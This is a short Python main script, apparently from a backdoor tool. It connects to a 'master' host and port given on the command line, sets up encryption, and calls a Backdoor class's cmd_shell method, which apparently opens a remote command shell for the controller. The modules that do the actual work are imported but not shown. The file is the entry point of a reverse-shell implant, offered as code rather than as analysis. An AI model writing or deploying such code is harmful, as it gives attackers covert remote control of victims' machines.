#!/bin/usr/python3

from lib.connection import Connection
from lib.cli import CLI
from lib.backdoor import Backdoor
from lib.crypto import Crypto

def main():
    cli = CLI()
    crypto = Crypto()

    connection = Connection(cli.master_hostname, cli.master_port, crypto)
    conn = connection.connect_master()

    backdoor = Backdoor(connection.conn, cli.master_hostname, cli.master_port, crypto)
    backdoor.cmd_shell()

    return 0

if __name__ == "__main__":
    main()